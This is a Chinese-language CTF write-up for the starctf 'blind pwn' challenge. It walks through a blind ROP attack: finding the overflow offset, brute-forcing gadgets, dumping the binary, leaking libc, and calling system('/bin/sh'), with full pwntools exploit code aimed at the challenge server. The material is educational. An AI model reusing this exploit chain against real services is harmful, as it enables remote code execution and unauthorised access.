---
layout: post
title:  "starctf blind pwn"
categories: ctf
tags: starctf brop
author: ble55ing
---

* content
{:toc}

## starctf blind pwn writeup

blind pwn，顾名思义，没给源文件的题目

首先看一下程序的执行情况，程序输出welcome，然后接收一个字符串，再输出Goodbye。

![](https://raw.githubusercontent.com/ble55ing/PicGo/master/first.png)

![](https://raw.githubusercontent.com/ble55ing/PicGo/master/try.png)

这题没有printf，所以应该是没有格式化字符串的，按照这种题目的情况，应该是一个很简单的程序，有一个栈溢出的漏洞。

## 一、填充偏移

第一步，构造padding，找到偏移。

```
def getbuflength():
    i = 0
    while 1:
        try:
            sh = remote('34.92.37.22', 10000)
            sh.recvuntil('Welcome to this blind pwn!\n')
            sh.send(i * 'a')
            rev = sh.recv()
            sh.close()
            if not rev.startswith('Goodbye!'):
                return i - 1
            else:
                i += 1
        except EOFError:
            sh.close()
            return i - 1
```

## 二、进入循环

第二步，找到一个能使程序进入循环的地方（main函数开始地址）

main函数开始地址的特征比较明显，就是由多个能够正常执行而且显示welcome的地方。

```
def get_main_addr(length):
    addr = 0x400000
    while 1:
        if addr %0x80==0:
            print hex(addr)
        try:
            sh = remote('34.92.37.22', 10000)
            sh.recvuntil('pwn!\n')
            payload = 'a' * length + p64(addr)
            sh.sendline(payload)
            content = sh.recv()
            print content
            sh.close()
            return addr
        except Exception:
            addr += 1
            sh.close()
```

## 三、找到输出函数

已经控制了流程，然后就需要找到方便rop的gadget，16进制程序基本都有的如下所示：

![](https://raw.githubusercontent.com/ble55ing/PicGo/master/brop_gadget.png)

```
def get_brop_gadget(length, main_addr, addr):
    try:
        sh = remote('34.92.37.22', 10000)
        sh.recvuntil('pwn!\n')
        payload = 'a' * length + p64(addr) + p64(0) * 6 + p64(
            main_addr) + p64(0) * 10
        sh.sendline(payload)
        content = sh.recv()
        sh.close()
        print content
        if not content.startswith('Welcome'):
            return False
        return True
    except Exception:
        sh.close()
        return False
        
def check_brop_gadget(length, addr):
    try:
        sh = remote('34.92.37.22', 10000)
        sh.recvuntil('pwn!\n')
        payload = 'a' * length + p64(addr) + 'a' * 8 * 10
        sh.sendline(payload)
        content = sh.recv()
        sh.close()
        return False
    except Exception:
        sh.close()
        return True


def find_brop_gadget(length, main_addr):
    addr = 0x400000
    while 1:
        if addr%0x80==1:
            print hex(addr)
        if get_brop_gadget(length, main_addr, addr):
            if check_brop_gadget(length, addr):
                return addr
        addr += 1
```

找到brop gadget之后就应该是使用rdi，根据0x400000的回显结果再去找put函数了。然而找了半天没找到。然后再不停的尝试中找到了当有两个参数输入 的时候，是可以正常获得地址的数据的，于是就使用rsi_rdi_ret的gadget来放两个参数，获得程序的信息（其实是相当于把整个程序相当于都打了出来）。打印的时候注意到是一次打出0x100大小的长度，做完证实应该是write函数（当时并不知道）。

```
def leak(length, rsi_rdi_ret, puts_plt, leak_addr, mainaddr):
    sh = remote('34.92.37.22', 10000)
    payload = 'a' * length + p64(rsi_rdi_ret) + p64(leak_addr) + p64(leak_addr)+ p64(
        puts_plt) + p64(mainaddr)
    sh.recvuntil('pwn!\n')
    sh.sendline(payload)
    try:
        data = sh.recv()
        sh.close()
        try:
            data = data[:data.index("\nWelcome")]
        except Exception:
            data = data
        if data == "":
            data = '\x00'
        return data
    except Exception:
        sh.close()
        return None


def leakfunction(length, rdi_ret, puts_plt, mainaddr):
    addr = 0x400000
    result = ""
    while addr < 0x401000:
        print hex(addr)
        data = leak(length, rdi_ret, puts_plt, addr, mainaddr)
        if data is None:
            continue
        else:
            result += data
            addr += len(data)
    with open('code', 'wb') as f:
        f.write(result)

```

然后就获得了这个程序的一部分，将code用ida使用binary格式加载，然后Edit->segment->rebase program更改加载基址，按c就能把16进制串转化为反汇编代码。然后找到打印函数的位置，可以看到它的got表位置，打印出来其中的地址是2b0结尾（然而不知道是什么函数还是没有办法）。

![](https://raw.githubusercontent.com/ble55ing/PicGo/master/write.png)

所以还是再分析分析还有啥别的函数没有，由于函数在读入字符的时候，\x00无所谓，\n才结束，所以猜测其为read函数，分析代码，找到其got表地址，为0x601028得到的其地址为。

![](https://raw.githubusercontent.com/ble55ing/PicGo/master/read1.png)

![](https://raw.githubusercontent.com/ble55ing/PicGo/master/read2.png)

![](https://raw.githubusercontent.com/ble55ing/PicGo/master/read3.png)

然后把其中的地址打出来，然后找到Libc-Search找到对应的库，然后system(“/bin/sh”)拿到shell

![](https://raw.githubusercontent.com/ble55ing/PicGo/master/final.png)

这中间还有一个小bug，Libc-Search找库的时间太长了程序都alarm结束了，所以中间还去找到了那个对应库然后再回来的

```
sh = remote('34.92.37.22', 10000)
sh.recvuntil('pwn!\n')
payload = 'a' * length + p64(rsi_rdi_ret) + p64(read_got) + p64(read_got)+ p64(puts_plt) + p64(
    mainaddr)
sh.sendline(payload)
data = sh.recvuntil('Welcome', drop=True)
print data
puts_addr = u64(data[:8].ljust(8, '\x00'))
print hex(puts_addr)
#libc = LibcSearcher('read', puts_addr)
libc_base = puts_addr - libc.symbols['read']
system_addr = libc_base + libc.symbols['system']
print system_addr
binsh_addr =libc_base +libc.search('/bin/sh').next()
#binsh_addr = libc_base + libc.dump('str_bin_sh')
payload = 'a' * length + p64(rdi_ret) + p64(binsh_addr) + p64(
    system_addr) + p64(mainaddr)
sh.sendline(payload)
sh.interactive()
```

另附解题wp的github[https://github.com/ble55ing/ctfpwn/blob/master/2019starctf/blind_pwn.py](https://github.com/ble55ing/ctfpwn/blob/master/2019starctf/blind_pwn.py)